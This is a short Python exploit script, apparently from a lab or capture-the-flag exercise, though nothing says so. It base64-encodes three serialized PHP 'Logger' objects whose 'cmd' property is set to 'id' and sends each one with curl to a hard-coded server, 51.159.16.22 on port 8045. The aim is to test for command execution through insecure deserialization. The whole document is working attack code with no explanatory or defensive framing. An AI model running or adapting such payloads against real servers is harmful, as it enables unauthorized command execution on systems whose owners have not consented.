import base64
import subprocess
from urllib.parse import quote

IP = "51.159.16.22"
PORT = "8045"

payloads = [
    b'O:6:"Logger":2:{s:3:"cmd";s:2:"id";s:7:"logfile";s:0:"";}',
    b'O:6:"Logger":2:{s:3:"cmd";s:2:"id";s:7:"logfile";s:12:"/tmp/out.log";}',
    b'O:6:"Logger":1:{s:3:"cmd";s:2:"id";}',
]

for payload in payloads:
    b64 = base64.b64encode(payload).decode()
    print(f"\nPayload: {payload}")
    url = f"http://{IP}:{PORT}/?data={quote(b64)}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    print(result.stdout)
